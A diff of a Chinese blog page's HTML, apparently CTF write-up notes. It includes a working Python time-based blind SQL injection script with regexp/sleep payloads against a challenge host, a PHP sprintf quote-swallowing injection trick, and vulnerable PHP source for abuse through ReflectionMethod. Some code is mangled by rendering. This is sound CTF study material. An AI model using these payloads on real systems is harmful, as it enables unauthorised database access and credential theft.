@@ -200,7 +200,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.7k 字
+      1.6k 字
     </span>
   
 
@@ -210,7 +210,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      24
+      23
        分钟
     </span>
   
@@ -255,199 +255,199 @@
             <div class="markdown-body">
               <h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>MT的第一题，时间盲注，但是常见的字符都过了<code>ascii</code>、<code>substr</code>,大于号小于号等于号，<code>lile</code>,<code>if</code>都过了，不会了   </p>
 <p><code>W&amp;M</code> 的WP   </p>
-<pre><code><pre><code class="hljs python">    <span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> req
-    <span class="hljs-keyword">import</span> time
+<pre><code><pre class="language-python" data-language="python"><code class="language-python">    <span class="token keyword">import</span> requests <span class="token keyword">as</span> req
+    <span class="token keyword">import</span> time
 
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ord2hex</span>(<span class="hljs-params">string</span>):</span>
-    result = <span class="hljs-string">&#x27;&#x27;</span>
-    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string:
-        result += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))
+    <span class="token keyword">def</span> <span class="token function">ord2hex</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    result <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> string<span class="token punctuation">:</span>
+        result <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
-    result = result.replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)
-    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0x&#x27;</span>+result
+    result <span class="token operator">=</span> result<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token string">'0x'</span><span class="token operator">+</span>result
 
 
-    url = <span class="hljs-string">&quot;http://eci-2ze7bgvjvxtgmki6mtcj.cloudeci1.ichunqiu.com/index.php&quot;</span>
-    string = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>]
-    headers = &#123;
-        <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0&#x27;</span>,
-        <span class="hljs-string">&#x27;Accept&#x27;</span>:<span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,
-        <span class="hljs-string">&#x27;Connection&#x27;</span>:<span class="hljs-string">&#x27;keep-alive&#x27;</span>
-        &#125;
+    url <span class="token operator">=</span> <span class="token string">"http://eci-2ze7bgvjvxtgmki6mtcj.cloudeci1.ichunqiu.com/index.php"</span>
+    string <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_'</span><span class="token punctuation">]</span>
+    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0'</span><span class="token punctuation">,</span>
+        <span class="token string">'Accept'</span><span class="token punctuation">:</span><span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span><span class="token punctuation">,</span>
+        <span class="token string">'Connection'</span><span class="token punctuation">:</span><span class="token string">'keep-alive'</span>
+        <span class="token punctuation">&#125;</span>
 
-    res = <span class="hljs-string">&#x27;&#x27;</span>
-    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):
-    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> string:
-        passwd = ord2hex(<span class="hljs-string">&#x27;^&#x27;</span>+res+<span class="hljs-built_in">chr</span>(j))
-        <span class="hljs-comment">#print(passwd)</span>
-        passwd = <span class="hljs-string">&#x27;||case/**/when/**/password/**/regexp/**/binary/**/&#123;&#125;/**/then/**/sleep(3)/**/else/**/1111111/**/end/**/#&#x27;</span>.<span class="hljs-built_in">format</span>(passwd)
-        <span class="hljs-comment">#print(passwd)</span>
-        data = &#123;
-        <span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">&quot;admin\\&quot;</span>,
-        <span class="hljs-string">&#x27;password&#x27;</span>:passwd
-        &#125;
-        before_time = time.time()
-        r = req.post(url, data=data, headers=headers)
-        after_time = time.time()
-        <span class="hljs-comment">#print( r.text)</span>
-        offset = after_time - before_time
-        <span class="hljs-comment"># print(offset)</span>
-        <span class="hljs-keyword">if</span> (offset &gt; <span class="hljs-number">2</span>):
-        print(passwd)
-        res += <span class="hljs-built_in">chr</span>(j)
-        print(res)
-        <span class="hljs-keyword">break</span>
-    <span class="hljs-comment">#password This_1s_thE_Passw0rd</span>
+    res <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> string<span class="token punctuation">:</span>
+        passwd <span class="token operator">=</span> ord2hex<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token operator">+</span>res<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token comment">#print(passwd)</span>
+        passwd <span class="token operator">=</span> <span class="token string">'||case/**/when/**/password/**/regexp/**/binary/**/&#123;&#125;/**/then/**/sleep(3)/**/else/**/1111111/**/end/**/#'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span>
+        <span class="token comment">#print(passwd)</span>
+        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string">"admin\\"</span><span class="token punctuation">,</span>
+        <span class="token string">'password'</span><span class="token punctuation">:</span>passwd
+        <span class="token punctuation">&#125;</span>
+        before_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        r <span class="token operator">=</span> req<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
+        after_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token comment">#print( r.text)</span>
+        offset <span class="token operator">=</span> after_time <span class="token operator">-</span> before_time
+        <span class="token comment"># print(offset)</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>offset <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span>
+        res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
+        <span class="token keyword">break</span>
+    <span class="token comment">#password This_1s_thE_Passw0rd</span>
     ```    
 
 
 
 `case when`  
 
-![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">05</span>/<span class="hljs-number">27e74714170</span>e20bb.png)    
+!<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>ftp<span class="token punctuation">.</span>bmp<span class="token punctuation">.</span>ovh<span class="token operator">/</span>imgs<span class="token operator">/</span><span class="token number">2021</span><span class="token operator">/</span><span class="token number">05</span><span class="token operator">/</span><span class="token number">27e74714170e20bb.</span>png<span class="token punctuation">)</span>    
 
 `regexp`正则匹配     
 
 这个匹配可以直接匹配到字符的十六进制，Mysql会将十六进制转换      
 
-![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">05</span>/<span class="hljs-number">69215</span>b03e678fd6b.png)        
+!<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>ftp<span class="token punctuation">.</span>bmp<span class="token punctuation">.</span>ovh<span class="token operator">/</span>imgs<span class="token operator">/</span><span class="token number">2021</span><span class="token operator">/</span><span class="token number">05</span><span class="token operator">/</span><span class="token number">69215b03e678fd6b.</span>png<span class="token punctuation">)</span>        
 
-<span class="hljs-comment">## easytricks </span>
+<span class="token comment">## easytricks </span>
 MT      
 也有SQL注入的点   
-` select * <span class="hljs-keyword">from</span> user where user=<span class="hljs-string">&#x27;$user&#x27;</span> <span class="hljs-keyword">and</span> passwd=<span class="hljs-string">&#x27;%s&#x27;</span>`    
-%s----&gt;字符串      
+` select <span class="token operator">*</span> <span class="token keyword">from</span> user where user<span class="token operator">=</span><span class="token string">'$user'</span> <span class="token keyword">and</span> passwd<span class="token operator">=</span><span class="token string">'%s'</span>`    
+<span class="token operator">%</span>s<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>字符串      
 
-[sprintf格式化注入漏洞](https://blog.csdn.net/weixin_41185953/article/details/<span class="hljs-number">80485075</span>)     
+<span class="token punctuation">[</span>sprintf格式化注入漏洞<span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>blog<span class="token punctuation">.</span>csdn<span class="token punctuation">.</span>net<span class="token operator">/</span>weixin_41185953<span class="token operator">/</span>article<span class="token operator">/</span>details<span class="token operator">/</span><span class="token number">80485075</span><span class="token punctuation">)</span>     
 
-`没做字符类型检测的最大危害就是它可以吃掉一个转义符\, 如果%后面出现一个\,那么php会把\当作一个格式化字符的类型而吃掉\, 最后%\（或%<span class="hljs-number">1</span>$\）被替换为空`  
+`没做字符类型检测的最大危害就是它可以吃掉一个转义符\<span class="token punctuation">,</span> 如果<span class="token operator">%</span>后面出现一个\<span class="token punctuation">,</span>那么php会把\当作一个格式化字符的类型而吃掉\<span class="token punctuation">,</span> 最后<span class="token operator">%</span>\（或<span class="token operator">%</span><span class="token number">1</span>$\）被替换为空`  
 
-![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">05</span>/<span class="hljs-number">7</span>b7afea854b5deba.png)     
-可以看到`%<span class="hljs-number">1</span>$`后的`<span class="hljs-string">&#x27;`被吞了      </span>
-<span class="hljs-string"></span>
-<span class="hljs-string">[MTCTF-2021 Write_Up by 打CTF不靠实力靠运气](https://mp.weixin.qq.com/s/zP7pOdL0zbWzKMJlVcff-Q)     </span>
-<span class="hljs-string"></span>
-<span class="hljs-string"></span>
-<span class="hljs-string">##  easy_source   </span>
-<span class="hljs-string">CISCN   </span>
-<span class="hljs-string"></span>
-<span class="hljs-string"></span>
-<span class="hljs-string">`.index.php.swo`    </span>
-<span class="hljs-string"></span>
-<span class="hljs-string">    ```php</span>
-<span class="hljs-string">    &lt;?php</span>
-<span class="hljs-string">    class User</span>
-<span class="hljs-string">    &#123;</span>
-<span class="hljs-string">        private static $c = 0;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">        function a()</span>
-<span class="hljs-string">        &#123;</span>
-<span class="hljs-string">            return ++self::$c;</span>
-<span class="hljs-string">        &#125;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">        function b()</span>
-<span class="hljs-string">        &#123;</span>
-<span class="hljs-string">            return ++self::$c;</span>
-<span class="hljs-string">        &#125;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">        function c()</span>
-<span class="hljs-string">        &#123;</span>
-<span class="hljs-string">            return ++self::$c;</span>
-<span class="hljs-string">        &#125;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">        function d()</span>
-<span class="hljs-string">        &#123;</span>
-<span class="hljs-string">            return ++self::$c;</span>
-<span class="hljs-string">        &#125;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">        function e()</span>
-<span class="hljs-string">        &#123;</span>
-<span class="hljs-string">            return ++self::$c;</span>
-<span class="hljs-string">        &#125;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">        function f()</span>
-<span class="hljs-string">        &#123;</span>
-<span class="hljs-string">            return ++self::$c;</span>
-<span class="hljs-string">        &#125;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">        function g()</span>
-<span class="hljs-string">        &#123;</span>
-<span class="hljs-string">            return ++self::$c;</span>
-<span class="hljs-string">        &#125;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">        function h()</span>
-<span class="hljs-string">        &#123;</span>
-<span class="hljs-string">            return ++self::$c;</span>
-<span class="hljs-string">        &#125;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">        function i()</span>
-<span class="hljs-string">        &#123;</span>
-<span class="hljs-string">            return ++self::$c;</span>
-<span class="hljs-string">        &#125;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">        function j()</span>
-<span class="hljs-string">        &#123;</span>
-<span class="hljs-string">            return ++self::$c;</span>
-<span class="hljs-string">        &#125;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">        function k()</span>
-<span class="hljs-string">        &#123;</span>
-<span class="hljs-string">            return ++self::$c;</span>
-<span class="hljs-string">        &#125;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">        function l()</span>
-<span class="hljs-string">        &#123;</span>
-<span class="hljs-string">            return ++self::$c;</span>
-<span class="hljs-string">        &#125;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">        function m()</span>
-<span class="hljs-string">        &#123;</span>
-<span class="hljs-string">            return ++self::$c;</span>
-<span class="hljs-string">        &#125;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">        function n()</span>
-<span class="hljs-string">        &#123;</span>
-<span class="hljs-string">            return ++self::$c;</span>
-<span class="hljs-string">        &#125;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">        function o()</span>
-<span class="hljs-string">        &#123;</span>
-<span class="hljs-string">            return ++self::$c;</span>
-<span class="hljs-string">        &#125;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">        function p()</span>
-<span class="hljs-string">        &#123;</span>
-<span class="hljs-string">            return ++self::$c;</span>
-<span class="hljs-string">        &#125;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">        function q()</span>
-<span class="hljs-string">        &#123;</span>
-<span class="hljs-string">            return ++self::$c;</span>
-<span class="hljs-string">        &#125;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">        function r()</span>
-<span class="hljs-string">        &#123;</span>
-<span class="hljs-string">            return ++self::$c;</span>
-<span class="hljs-string">        &#125;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">        function s()</span>
-<span class="hljs-string">        &#123;</span>
-<span class="hljs-string">            return ++self::$c;</span>
-<span class="hljs-string">        &#125;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">        function t()</span>
-<span class="hljs-string">        &#123;</span>
-<span class="hljs-string">            return ++self::$c;</span>
-<span class="hljs-string">        &#125;</span>
-<span class="hljs-string">        </span>
-<span class="hljs-string">    &#125;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">    $rc=$_GET[&quot;rc&quot;];</span>
-<span class="hljs-string">    $rb=$_GET[&quot;rb&quot;];</span>
-<span class="hljs-string">    $ra=$_GET[&quot;ra&quot;];</span>
-<span class="hljs-string">    $rd=$_GET[&quot;rd&quot;];</span>
-<span class="hljs-string">    $method= new $rc($ra, $rb);</span>
-<span class="hljs-string">    var_dump($method-&gt;$rd());</span></code></pre></code></pre>
+!<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>ftp<span class="token punctuation">.</span>bmp<span class="token punctuation">.</span>ovh<span class="token operator">/</span>imgs<span class="token operator">/</span><span class="token number">2021</span><span class="token operator">/</span><span class="token number">05</span><span class="token operator">/</span><span class="token number">7b7afea854b5deba.</span>png<span class="token punctuation">)</span>     
+可以看到`<span class="token operator">%</span><span class="token number">1</span>$`后的`'`被吞了      
+
+<span class="token punctuation">[</span>MTCTF<span class="token operator">-</span><span class="token number">2021</span> Write_Up by 打CTF不靠实力靠运气<span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>mp<span class="token punctuation">.</span>weixin<span class="token punctuation">.</span>qq<span class="token punctuation">.</span>com<span class="token operator">/</span>s<span class="token operator">/</span>zP7pOdL0zbWzKMJlVcff<span class="token operator">-</span>Q<span class="token punctuation">)</span>     
+
+
+<span class="token comment">##  easy_source   </span>
+CISCN   
+
+
+`<span class="token punctuation">.</span>index<span class="token punctuation">.</span>php<span class="token punctuation">.</span>swo`    
+
+    ```php
+    <span class="token operator">&lt;</span>?php
+    <span class="token keyword">class</span> <span class="token class-name">User</span>
+    <span class="token punctuation">&#123;</span>
+        private static $c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+        function a<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        function b<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        function c<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        function d<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        function e<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        function f<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        function g<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        function h<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        function i<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        function j<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        function k<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        function l<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        function m<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        function n<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        function o<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        function p<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        function q<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        function r<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        function s<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        function t<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token operator">+</span><span class="token operator">+</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span>$c<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        
+    <span class="token punctuation">&#125;</span>
+
+    $rc<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">"rc"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    $rb<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">"rb"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    $ra<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">"ra"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    $rd<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">"rd"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    $method<span class="token operator">=</span> new $rc<span class="token punctuation">(</span>$ra<span class="token punctuation">,</span> $rb<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    var_dump<span class="token punctuation">(</span>$method<span class="token operator">-</span><span class="token operator">></span>$rd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></code></pre>
 <p>利用PHP原生类读取类中的注释<br><code>ReflectionMethod</code>  </p>
 <p><code>public ReflectionMethod::__construct ( mixed $class , string $name )</code><br>–&gt;$class类的名称      </p>
 <p>–&gt;$name方法的名称         </p>
